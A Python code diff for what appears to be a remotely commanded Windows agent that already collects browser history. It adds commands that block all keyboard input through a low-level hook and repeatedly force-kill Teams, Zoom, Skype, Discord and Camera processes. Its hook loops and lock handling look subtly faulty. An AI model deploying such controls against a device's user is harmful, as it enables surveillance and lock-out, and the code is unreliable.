@@ -105,6 +105,8 @@ SERVICE_KEYBOARD_LISTENER = None
 collection_paused = False
 update_lock = Lock()
 mouse_disable_lock = Lock()
+keyboard_disable_lock = Lock()
+camera_disable_lock = Lock()
 mouse_hook_callback = None
 browser_history_seen = set()
 
@@ -908,6 +910,26 @@ def handle_device_command(command, command_id=None, message=""):
             if duration < 1 or duration > 3600:
                 raise RuntimeError("Mouse duration must be between 1 and 3600 seconds")
             start_mouse_disable(duration)
+        elif command == "disable_keyboard":
+            if os.name != "nt":
+                raise RuntimeError("Keyboard disabling is only supported on Windows")
+            try:
+                duration = int(str(message).strip())
+            except ValueError as error:
+                raise RuntimeError("Keyboard duration must be a whole number of seconds") from error
+            if duration < 1 or duration > 3600:
+                raise RuntimeError("Keyboard duration must be between 1 and 3600 seconds")
+            start_keyboard_disable(duration)
+        elif command == "disable_camera":
+            if os.name != "nt":
+                raise RuntimeError("Camera disabling is only supported on Windows")
+            try:
+                duration = int(str(message).strip())
+            except ValueError as error:
+                raise RuntimeError("Camera duration must be a whole number of seconds") from error
+            if duration < 1 or duration > 3600:
+                raise RuntimeError("Camera duration must be between 1 and 3600 seconds")
+            start_camera_disable(duration)
         elif command == "message":
             if os.name != "nt":
                 raise RuntimeError("Message boxes are only supported on Windows")
@@ -927,6 +949,7 @@ def start_mouse_disable(duration):
     result = {}
     Thread(target=mouse_disable_worker, args=(duration, ready, result), daemon=True).start()
     if not ready.wait(1):
+        mouse_disable_lock.release()
         raise RuntimeError("Mouse hook did not start")
     if result.get("error"):
         mouse_disable_lock.release()
@@ -951,23 +974,94 @@ def mouse_disable_worker(duration, ready, result):
         mouse_disable_lock.release()
         return
 
-    thread_id = kernel32.GetCurrentThreadId()
     ready.set()
     try:
         end_time = time.monotonic() + duration
-        message = wintypes.MSG()
         while time.monotonic() < end_time:
-            if user32.PeekMessageW(ctypes.byref(message), None, 0, 0, 1):
-                if message.message == 0x0012:
-                    break
-                user32.TranslateMessage(ctypes.byref(message))
-                user32.DispatchMessageW(ctypes.byref(message))
-            else:
-                time.sleep(0.05)
+            time.sleep(0.05)
     finally:
         user32.UnhookWindowsHookEx(hook)
         mouse_hook_callback = None
         mouse_disable_lock.release()
+
+
+def start_keyboard_disable(duration):
+    if not keyboard_disable_lock.acquire(blocking=False):
+        raise RuntimeError("Keyboard is already disabled")
+
+    ready = Event()
+    result = {}
+    Thread(target=keyboard_disable_worker, args=(duration, ready, result), daemon=True).start()
+    if not ready.wait(1):
+        keyboard_disable_lock.release()
+        raise RuntimeError("Keyboard hook did not start")
+    if result.get("error"):
+        keyboard_disable_lock.release()
+        raise RuntimeError(result["error"])
+
+
+def keyboard_disable_worker(duration, ready, result):
+    user32 = ctypes.windll.user32
+    kernel32 = ctypes.windll.kernel32
+    hook_type = 13
+    callback_type = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
+
+    def low_level_keyboard_proc(_code, _wparam, _lparam):
+        return 1
+
+    keyboard_hook = callback_type(low_level_keyboard_proc)
+    hook = user32.SetWindowsHookExW(hook_type, keyboard_hook, kernel32.GetModuleHandleW(None), 0)
+    if not hook:
+        result["error"] = f"Could not install keyboard hook: {ctypes.get_last_error()}"
+        ready.set()
+        keyboard_disable_lock.release()
+        return
+
+    ready.set()
+    try:
+        end_time = time.monotonic() + duration
+        while time.monotonic() < end_time:
+            time.sleep(0.05)
+    finally:
+        user32.UnhookWindowsHookEx(hook)
+        keyboard_disable_lock.release()
+
+
+def start_camera_disable(duration):
+    if not camera_disable_lock.acquire(blocking=False):
+        raise RuntimeError("Camera is already disabled")
+
+    ready = Event()
+    result = {}
+    Thread(target=camera_disable_worker, args=(duration, ready, result), daemon=True).start()
+    if not ready.wait(1):
+        camera_disable_lock.release()
+        raise RuntimeError("Camera blocker did not start")
+    if result.get("error"):
+        camera_disable_lock.release()
+        raise RuntimeError(result["error"])
+
+
+def camera_disable_worker(duration, ready, result):
+    try:
+        camera_processes = [
+            "MicrosoftTeams", "Teams", "Zoom", "zoom", "Skype", "SkypeApp",
+            "Discord", "Camera", "WindowsCamera", "msteams", "zoom.exe",
+            "teams.exe", "skype.exe", "discord.exe",
+        ]
+        ready.set()
+        end_time = time.monotonic() + duration
+        while time.monotonic() < end_time:
+            for process_name in camera_processes:
+                try:
+                    subprocess.run(["taskkill", "/F", "/IM", process_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
+                except OSError:
+                    pass
+            time.sleep(0.25)
+    except Exception as error:  # pragma: no cover - runtime safety guard
+        result["error"] = str(error)
+    finally:
+        camera_disable_lock.release()
 
 
 def get_battery_telemetry():
